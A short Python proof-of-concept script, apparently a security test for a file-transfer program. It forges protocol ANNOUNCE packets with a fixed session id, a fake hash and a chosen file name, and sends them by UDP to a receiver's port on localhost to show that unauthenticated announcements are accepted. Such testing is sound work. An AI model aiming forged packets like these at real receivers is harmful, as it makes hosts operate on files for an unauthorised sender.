#!/usr/bin/env python3
"""Fire forged ANNOUNCEs at a receiver's bind port: no proxy, no sender."""
#
#   inject_announce.py <port> [count] [file_size] [chunk] [name]
#
# Any LAN host can announce a transfer nobody asked for. The packets are
# well-formed but describe a foreign file, so a receiver that honours them
# touches on-disk files on a stranger's behalf.

import socket
import struct
import sys
import time


def main(argv):
    """Send `count` identical announcements, 200 ms apart."""
    if len(argv) < 2:
        print("usage: inject_announce.py <port> [count] [size] [chunk] [name]",
              file=sys.stderr)
        return 2
    port = int(argv[1])
    count = int(argv[2]) if len(argv) > 2 else 3
    size = int(argv[3]) if len(argv) > 3 else 5000
    chunk = int(argv[4]) if len(argv) > 4 else 1400
    name = (argv[5] if len(argv) > 5 else "evil").encode()

    # Wire layout from src/Protocol.hpp (v3): magic(4) + version(1) + type(1) +
    # session(4), then file_size(4) + chunk_size(4) + sha256(32) + name_len(2).
    pkt = (b"FCST" + bytes([3, 1]) + struct.pack(">III", 0xDEADBEEF, size, chunk)
           + bytes([0xAB]) * 32 + struct.pack(">H", len(name)) + name)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(count):
        sock.sendto(pkt, ("127.0.0.1", port))
        if i + 1 < count:
            time.sleep(0.2)
    print(f"[inject] sent {count} foreign ANNOUNCE(s)", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
